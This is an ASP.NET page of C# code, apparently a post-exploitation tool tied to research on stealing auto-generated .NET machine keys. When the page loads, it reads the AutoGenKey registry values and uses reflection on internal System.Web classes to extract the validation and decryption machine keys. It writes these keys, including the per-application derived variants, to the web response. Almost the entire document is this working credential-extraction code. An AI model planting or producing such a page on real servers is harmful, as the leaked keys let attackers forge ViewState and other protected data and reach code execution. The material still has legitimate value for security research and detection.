<%@ Page Language="C#" %>
<%
// Read https://soroush.secproject.com/blog/2019/05/danger-of-stealing-auto-generated-net-machine-keys/
Response.Write("<br/><hr/>");
byte[] autoGenKeyV4 = (byte[]) Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\", "AutoGenKeyV4", new byte[]{});
if(autoGenKeyV4!=null)
	Response.Write("HKCU\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4: "+BitConverter.ToString(autoGenKeyV4).Replace("-", string.Empty));
Response.Write("<br/>");
byte[] autoGenKey = (byte[]) Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\", "AutoGenKey", new byte[]{});
if(autoGenKey!=null)
	Response.Write("HKCU\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey: "+BitConverter.ToString(autoGenKey).Replace("-", string.Empty));
Response.Write("<br/><hr/>");

var systemWebAsm = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
var machineKeySectionType = systemWebAsm.GetType("System.Web.Configuration.MachineKeySection");
var getApplicationConfigMethod = machineKeySectionType.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
var config = (System.Web.Configuration.MachineKeySection)getApplicationConfigMethod.Invoke(null, new object[0]);

Response.Write("<b>ValidationKey:</b> "+config.ValidationKey);
Response.Write("<br/>");
Response.Write("<b>DecryptionKey:</b> "+ config.DecryptionKey);
Response.Write("<br/><hr/>");

var typeMachineKeyMasterKeyProvider = systemWebAsm.GetType("System.Web.Security.Cryptography.MachineKeyMasterKeyProvider");
var instance = typeMachineKeyMasterKeyProvider.Assembly.CreateInstance(
	typeMachineKeyMasterKeyProvider.FullName, false,
	System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
	null, new object[] { config, null, null, null, null }, null, null);
var validationKey = typeMachineKeyMasterKeyProvider.GetMethod("GetValidationKey").Invoke(instance, new object[0]);
byte[] _validationKey = (byte[])validationKey.GetType().GetMethod("GetKeyMaterial").Invoke(validationKey, new object[0]);
var encryptionKey = typeMachineKeyMasterKeyProvider.GetMethod("GetEncryptionKey").Invoke(instance, new object[0]);
byte[] _decryptionKey = (byte[])validationKey.GetType().GetMethod("GetKeyMaterial").Invoke(encryptionKey, new object[0]);

Response.Write("<br/><b>ASP.NET 4.5 and above:</b><br/>");
Response.Write("<br/>");
Response.Write("<b>validationAlg:</b> "+config.Validation);
Response.Write("<br/>");
Response.Write("<b>validationKey:</b> "+BitConverter.ToString(_validationKey).Replace("-", string.Empty));
Response.Write("<br/>");
Response.Write("<b>decryptionAlg:</b> "+config.Decryption);
Response.Write("<br/>");
Response.Write("<b>decryptionKey:</b> "+BitConverter.ToString(_decryptionKey).Replace("-", string.Empty));
Response.Write("<br/><hr/>");

Response.Write("<br/><b>ASP.NET 4.0 and below:</b><br/>");
byte[] autogenKeys = (byte[])typeof(HttpRuntime).GetField("s_autogenKeys", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static).GetValue(null);
int validationKeySize = 64;
int decryptionKeySize = 24;
byte[] validationKeyAuto = new byte[validationKeySize];
byte[] decryptionKeyAuto = new byte[decryptionKeySize];
System.Buffer.BlockCopy(autogenKeys, 0, validationKeyAuto, 0, validationKeySize);
System.Buffer.BlockCopy(autogenKeys, validationKeySize, decryptionKeyAuto, 0, decryptionKeySize);
string appName = HttpRuntime.AppDomainAppVirtualPath;
string appId = HttpRuntime.AppDomainAppId;
Response.Write("<br/>");
Response.Write("<b>appName:</b> "+appName);
Response.Write("<br/>");
Response.Write("<b>appId:</b> "+appId);
Response.Write("<br/>");
Response.Write("<b>initial validationKey (not useful for direct use):</b> ");
Response.Write(BitConverter.ToString(validationKeyAuto).Replace("-", string.Empty));
Response.Write("<br/>");
Response.Write("<b>initial decryptionKey (not useful for direct use):</b> ");
Response.Write(BitConverter.ToString(decryptionKeyAuto).Replace("-", string.Empty));
Response.Write("<br/>");

byte[] _validationKeyAutoAppSpecific = validationKeyAuto.ToArray();
int dwCode3 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appName);
_validationKeyAutoAppSpecific[0] = (byte)(dwCode3 & 0xff);
_validationKeyAutoAppSpecific[1] = (byte)((dwCode3 & 0xff00) >> 8);
_validationKeyAutoAppSpecific[2] = (byte)((dwCode3 & 0xff0000) >> 16);
_validationKeyAutoAppSpecific[3] = (byte)((dwCode3 & 0xff000000) >> 24);
Response.Write("<b>App specific ValidationKey (when uses IsolateApps):</b> ");
Response.Write(BitConverter.ToString(_validationKeyAutoAppSpecific).Replace("-", string.Empty));
Response.Write("<br/>");

byte[] _validationKeyAutoAppIdSpecific = validationKeyAuto.ToArray();
int dwCode4 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appId);
_validationKeyAutoAppIdSpecific[4] = (byte)(dwCode4 & 0xff);
_validationKeyAutoAppIdSpecific[5] = (byte)((dwCode4 & 0xff00) >> 8);
_validationKeyAutoAppIdSpecific[6] = (byte)((dwCode4 & 0xff0000) >> 16);
_validationKeyAutoAppIdSpecific[7] = (byte)((dwCode4 & 0xff000000) >> 24);
Response.Write("<b>AppId Auto specific ValidationKey (when uses IsolateByAppId):</b> ");
Response.Write(BitConverter.ToString(_validationKeyAutoAppIdSpecific).Replace("-", string.Empty));
Response.Write("<br/>");

byte[] _decryptionKeyAutoAutoAppSpecific = decryptionKeyAuto.ToArray();
//int dwCode3 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appName);
_decryptionKeyAutoAutoAppSpecific[0] = (byte)(dwCode3 & 0xff);
_decryptionKeyAutoAutoAppSpecific[1] = (byte)((dwCode3 & 0xff00) >> 8);
_decryptionKeyAutoAutoAppSpecific[2] = (byte)((dwCode3 & 0xff0000) >> 16);
_decryptionKeyAutoAutoAppSpecific[3] = (byte)((dwCode3 & 0xff000000) >> 24);
Response.Write("<b>App specific DecryptionKey (when uses IsolateApps):</b> ");
Response.Write(BitConverter.ToString(_decryptionKeyAutoAutoAppSpecific).Replace("-", string.Empty));
Response.Write("<br/>");

byte[] _decryptionKeyAutoAutoAppIdSpecific = decryptionKeyAuto.ToArray();
//int dwCode4 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appId);
_decryptionKeyAutoAutoAppIdSpecific[4] = (byte)(dwCode4 & 0xff);
_decryptionKeyAutoAutoAppIdSpecific[5] = (byte)((dwCode4 & 0xff00) >> 8);
_decryptionKeyAutoAutoAppIdSpecific[6] = (byte)((dwCode4 & 0xff0000) >> 16);
_decryptionKeyAutoAutoAppIdSpecific[7] = (byte)((dwCode4 & 0xff000000) >> 24);
Response.Write("<b>AppId Auto specific DecryptionKey (when uses IsolateByAppId):</b> ");
Response.Write(BitConverter.ToString(_decryptionKeyAutoAutoAppIdSpecific).Replace("-", string.Empty));
Response.Write("<br/>");
%>
